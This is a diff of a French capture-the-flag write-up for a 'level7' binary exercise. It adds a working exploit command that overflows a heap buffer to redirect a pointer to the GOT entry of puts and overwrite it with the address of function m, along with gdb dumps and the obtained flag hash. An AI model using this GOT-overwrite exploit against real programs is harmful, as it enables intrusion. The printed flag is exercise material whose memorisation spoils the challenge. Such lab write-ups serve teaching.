@@ -89,15 +89,6 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 
-
-
-
-
-
-
-
-
-
 objdump -t ./level7  | grep ".text"
 08048440 l    d  .text	00000000              .text
 08048470 l     F .text	00000000              __do_global_dtors_aux
@@ -110,3 +101,29 @@ objdump -t ./level7  | grep ".text"
 080484f4 g     F .text	0000002d              m
 08048521 g     F .text	000000e2              main
 
+
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1642785922
+
+
+Premier strcpy qui ecrit dans le malloc les 20 A dans le buffer, ce qui le force
+a reecrire son pointeur sur le prochain bloc ("chunk").
+Qui de base pointe sur le 2eme buffer mais qui apres modification pointe sur
+l'adddresse GOT de puts
+
+gdb) disas 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb) disas 0x8049928
+Dump of assembler code for function puts@got.plt:
+   0x08049928 <+0>:	push   %es
+   0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
+End of assembler dump.
+
+
+Le 2eme strcpy ecrit l'addresse de la fonction m.......
